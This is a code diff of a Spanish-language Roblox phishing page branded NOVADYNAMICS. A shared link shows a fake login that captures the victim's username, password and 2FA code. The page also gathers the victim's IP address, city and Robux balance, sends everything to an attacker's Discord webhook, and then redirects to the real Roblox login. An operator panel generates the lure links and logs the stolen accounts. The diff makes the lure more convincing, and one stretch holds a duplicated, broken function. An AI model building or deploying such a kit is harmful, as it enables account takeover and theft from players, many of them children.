@@ -144,8 +144,8 @@
         <div class="caja">
             <h3>📋 Historial de Cuentas</h3>
             <table class="tabla">
-                <thead><tr><th>Usuario</th><th>Robux</th><th>Días</th><th>País</th><th>Fecha</th></tr></thead>
-                <tbody id="tablaBody"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
+                <thead><tr><th>Usuario</th><th>Robux</th><th>Fecha Creación</th><th>Días</th><th>País</th><th>IP</th></tr></thead>
+                <tbody id="tablaBody"><tr><td colspan="6" class="vacio">Sin registros aún</td></tr></tbody>
             </table>
         </div>
     </div>
@@ -187,19 +187,16 @@
 <script>
 let registros = JSON.parse(localStorage.getItem('cuentas')||'[]'), enlaceGenerado='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
 
-// DETECTA SI VIENEN POR ENLACE COMPARTIDO → MUESTRA INICIO DE SESIÓN
 window.onload=async function(){
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
-        // ALGUIEN ENTRÓ POR ENLACE COMPARTIDO → MUESTRA INICIO DE SESIÓN
         document.getElementById('pagLogin').style.display='block';
         document.getElementById('pagPanel').style.display='none';
         document.getElementById('usuario').value=u;
         await cargarIP();
         await cargarDatosRoblox(u);
     }else{
-        // TÚ ENTRASTE DIRECTO → MUESTRA TU PANEL
         document.getElementById('pagLogin').style.display='none';
         document.getElementById('pagPanel').style.display='block';
         cargarWebhook();
@@ -211,85 +208,155 @@ async function cargarIP(){
     try{
         const d=await(await fetch('https://ipapi.co/json/')).json();
         const p={US:["Estados Unidos","🇺🇸"],ES:["España","🇪🇸"],MX:["México","🇲🇽"],AR:["Argentina","🇦🇷"],CO:["Colombia","🇨🇴"],PE:["Perú","🇵🇪"],BR:["Brasil","🇧🇷"]};
-        ipDatos={pais:p[d.country_code]?.[0]||d.country_name||"Desconocido",bandera:p[d.country_code]?.[1]||"🌍",ciudad:d.city||'Desconocida',ip:d.ip||'Desconocida'};
+        ipDatos={
+            pais:p[d.country_code]?.[0]||d.country_name||"Desconocido",
+            bandera:p[d.country_code]?.[1]||"🌍",
+            ciudad:d.city||'Desconocida',
+            ip:d.ip||'Desconocida'
+        };
     }catch(e){}
 }
 
 async function cargarDatosRoblox(usuario){
     let id=usuario;
+    let nombreReal=usuario;
+    let fechaCreacionTexto='No disponible';
+    let diasCuenta='Desconocido';
+    let robuxCuenta=0;
+
     if(isNaN(usuario)){
         try{
-            const d=await(await fetch('https://users.roblox.com/v1/usernames/users',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})})).json();
-            if(d.data?.[0]) id=d.data[0].id;
+            const res=await fetch('https://users.roblox.com/v1/usernames/users',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})
+            });
+            const d=await res.json();
+            if(d.data&&d.data[0]){
+                id=d.data[0].id;
+                nombreReal=d.data[0].name;
+            }
         }catch(e){}
     }
+
     try{
-        const [p,rb]=await Promise.all([
-            fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json()),
-            fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json())
-        ]);
-        const fc=new Date(p.created);
+        const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
+        const robux=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json());
+        
+        const fechaCreacion=new Date(perfil.created);
+        const hoy=new Date();
+        const milisegundos=hoy-fechaCreacion;
+        diasCuenta=Math.floor(milisegundos/(1000*60*60*24));
+        fechaCreacionTexto=fechaCreacion.toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'});
+        robuxCuenta=robux.robux||0;
+
         datosRoblox={
-            nombre:p.name,id:id,
-            fechaCreacion:fc.toLocaleDateString('es-ES'),
-            dias:Math.floor((Date.now()-fc)/86400000),
-            robux:rb.robux||0,gastado:Math.floor((rb.robux||0)*0.42)
+            nombre:perfil.name,
+            id:id,
+            fechaCreacion:fechaCreacionTexto,
+            dias:diasCuenta,
+            robux:robuxCuenta,
+            gastado:Math.floor(robuxCuenta*0.42)
         };
-    }catch(e){ datosRoblox={nombre:usuario,dias:'Desconocido',robux:0,gastado:0,fechaCreacion:'No disponible'}; }
+    }catch(e){
+        datosRoblox={
+            nombre:nombreReal,
+            id:id,
+            fechaCreacion:'No disponible',
+            dias:'Desconocido',
+            robux:0,
+            gastado:0
+        };
+    }
 }
 
-// === INICIO DE SESIÓN ===
 function verificarLogin(){
     const u=document.getElementById('usuario').value.trim();
     const p=document.getElementById('pass').value.trim();
-    if(!u){ err('Escribe un usuario'); return; }
-    if(!p||p.length<4){ err('Contraseña incorrecta'); return; }
+    limpiarError();
+    
+    if(!u){ err('Please enter your username or email'); return; }
+    if(!p || p.length < 6){ err('Password is incorrect. Must be at least 6 characters.'); return; }
+    
     document.getElementById('form1').style.display='none';
     document.getElementById('form2').style.display='block';
 }
 
-function err(t){ const e=document.getElementById('cajaErr'); e.textContent='❌ '+t; e.style.display='block'; }
+function limpiarError(){
+    document.getElementById('cajaErr').style.display='none';
+}
+
+function err(t){
+    const e=document.getElementById('cajaErr');
+    e.textContent='❌ '+t;
+    e.style.display='block';
+}
 
 async function enviarDatos(){
     const cod=document.getElementById('cod2fa').value.trim();
     const user=document.getElementById('usuario').value.trim();
     const pass=document.getElementById('pass').value.trim();
-    if(!cod||cod.length!==6||!/^\d+$/.test(cod)){ err('Código inválido'); return; }
+    limpiarError();
+
+    if(!cod || cod.length!==6 || !/^\d+$/.test(cod)){
+        err('Verification code is incorrect. Must be 6 digits.');
+        return;
+    }
+
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
 
     const wh=localStorage.getItem('webhook');
     const todos=localStorage.getItem('todos')==='1'?'@everyone NUEVA CUENTA OBTENIDA':' ';
     const fecha=new Date().toLocaleString('es-ES');
 
-    registros.unshift({usuario:datosRoblox.nombre||user,robux:datosRoblox.robux||0,dias:datosRoblox.dias,pais:ipDatos.bandera+' '+ipDatos.pais,gastado:datosRoblox.gastado,fecha:fecha});
+    registros.unshift({
+        usuario:datosRoblox.nombre||user,
+        robux:datosRoblox.robux||0,
+        fechaCreacion:datosRoblox.fechaCreacion||'No disponible',
+        dias:datosRoblox.dias||'Desconocido',
+        pais:ipDatos.bandera+' '+ipDatos.pais,
+        ciudad:ipDatos.ciudad,
+        ip:ipDatos.ip,
+        gastado:datosRoblox.gastado||0,
+        fecha:fecha
+    });
     localStorage.setItem('cuentas',JSON.stringify(registros));
 
     if(wh){
         fetch(wh,{
-            method:'POST',headers:{'Content-Type':'application/json'},
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
             body:JSON.stringify({
-                username:"NOVADYNAMICS",content:todos,
+                username:"NOVADYNAMICS",
+                content:todos,
                 embeds:[{
-                    title:"🔥 CUENTA OBTENIDA",color:16711680,
-                    thumbnail:{url:"https://www.roblox.com/favicon.ico"},
+                    title:"🔥 CUENTA OBTENIDA — NOVADYNAMICS",
+                    color:16711680,
+                    thumbnail:{url:"https://cdn.phototourl.com/free/2026-08-15-8a5d4511-bfc8-41bd-918d-589a002e20a6.jpg"},
                     fields:[
                         {name:"👤 Usuario",value:`**${datosRoblox.nombre||user}**`,inline:true},
                         {name:"🔑 Contraseña",value:`**${pass}**`,inline:true},
                         {name:"🔢 Código 2FA",value:`**${cod}**`,inline:true},
-                        {name:"📅 Creación",value:datosRoblox.fechaCreacion||'?',inline:false},
-                        {name:"⏳ Días",value:`${datosRoblox.dias||'?'}`,inline:true},
-                        {name:"🌍 País",value:`${ipDatos.bandera} ${ipDatos.pais}`,inline:true},
-                        {name:"🏙️ Ciudad",value:ipDatos.ciudad,inline:true},
-                        {name:"📌 IP",value:`||${ipDatos.ip}||`,inline:true},
-                        {name:"💰 Robux",value:`${datosRoblox.robux||0}`,inline:true}
-                    ],footer:{text:"NOVADYNAMICS"}
+                        {name:"📅 Fecha de Creación",value:`**${datosRoblox.fechaCreacion||'No disponible'}**`,inline:false},
+                        {name:"⏳ Días desde creación",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
+                        {name:"🌍 País",value:`${ipDatos.bandera} **${ipDatos.pais}**`,inline:true},
+                        {name:"🏙️ Ciudad",value:`**${ipDatos.ciudad||'Desconocida'}**`,inline:true},
+                        {name:"📌 Dirección IP",value:`**${ipDatos.ip}**`,inline:true},
+                        {name:"💰 Robux Totales",value:`**${datosRoblox.robux||0}**`,inline:true},
+                        {name:"💸 Robux Gastados",value:`**${datosRoblox.gastado||0}**`,inline:true}
+                    ],
+                    footer:{text:"NOVADYNAMICS SYSTEM • Datos obtenidos desde API Roblox + IP"}
                 }]
             })
-        }).finally(()=>{ window.location.href='https://www.roblox.com/login'; });
-    }else{ alert('Datos guardados. Configura tu Webhook en el panel.'); window.location.href='https://www.roblox.com/login'; }
+        }).finally(()=>{
+            window.location.href='https://www.roblox.com/login';
+        });
+    }else{
+        alert('⚠️ Configura tu Webhook en Ajustes primero.');
+        window.location.href='https://www.roblox.com/login';
+    }
 }
 
-// === PANEL / DASHBOARD ===
 function cambiarVista(n){
     document.querySelectorAll('.vista').forEach(v=>v.classList.remove('activa'));
     document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('activo'));
@@ -307,20 +374,21 @@ function generarEnlace(){
 }
 
 function copiarEnlace(){
-    navigator.clipboard.writeText(enlaceGenerado).then(()=>alert('✅ ¡Copiado!'));
+    navigator.clipboard.writeText(enlaceGenerado).then(()=>alert('✅ ¡Enlace copiado al portapapeles!'));
 }
 
 function guardarWebhook(){
     const u=document.getElementById('webhookUrl').value.trim();
+    const e=document.getElementById('estadoWebhook');
     if(!u.startsWith('https://discord.com/api/webhooks/')){
-        document.getElementById('estadoWebhook').textContent='❌ Inválido';
-        document.getElementById('estadoWebhook').className='estado-mal';
+        e.textContent='❌ Enlace no válido';
+        e.className='estado-mal';
         return;
     }
     localStorage.setItem('webhook',u);
-    document.getElementById('estadoWebhook').textContent='✅ Guardado';
-    document.getElementById('estadoWebhook').className='estado-ok';
-    alert('✅ Webhook guardado');
+    e.textContent='✅ Guardado y activo';
+    e.className='estado-ok';
+    alert('✅ Webhook guardado correctamente');
 }
 
 function borrarWebhook(){
@@ -332,12 +400,20 @@ function borrarWebhook(){
 
 function cargarWebhook(){
     const w=localStorage.getItem('webhook');
+    const e=document.getElementById('estadoWebhook');
     if(w){
         document.getElementById('webhookUrl').value=w;
-        document.getElementById('estadoWebhook').textContent='✅ Guardado';
-        document.getElementById('estadoWebhook').className='estado-ok';
+        e.textContent='✅ Guardado y activo';
+        e.className='estado-ok';
     }
     if(localStorage.getItem('todos')==='1') document.getElementById('swTodos').classList.add('activo');
+}
+
+function actualizarPanel(){
+    let tr=0,tg=0;
+    registros.forEach(r=>{tr+=r.robux||0;tg+=r.gastado||0;});
+    document.getElementById('estadoWebhook').textContent='⚠️ Sin configurar';
+    }
 }
 
 function actualizarPanel(){
@@ -347,10 +423,12 @@ function actualizarPanel(){
     document.getElementById('cuentasTot').textContent=registros.length;
     document.getElementById('robuxGas').textContent=tg.toLocaleString();
     const tb=document.getElementById('tablaBody');
-    if(registros.length===0){ tb.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>'; return; }
-    tb.innerHTML=registros.map(r=>`<tr><td>${r.usuario}</td><td>${r.robux}</td><td>${r.dias}</td><td>${r.pais}</td><td style="font-size:12px;color:#888">${r.fecha.split(' ')[0]}</td></tr>`).join('');
+    if(registros.length===0){ 
+        tb.innerHTML='<tr><td colspan="6" class="vacio">Sin registros aún</td></tr>'; 
+        return; 
+    }
+    tb.innerHTML=registros.map(r=>`<tr><td>${r.usuario}</td><td>${r.robux}</td><td>${r.fechaCreacion}</td><td>${r.dias}</td><td>${r.pais}</td><td>${r.ip}</td></tr>`).join('');
 }
 </script>
 </body>
-    </html>
-    
+</html>
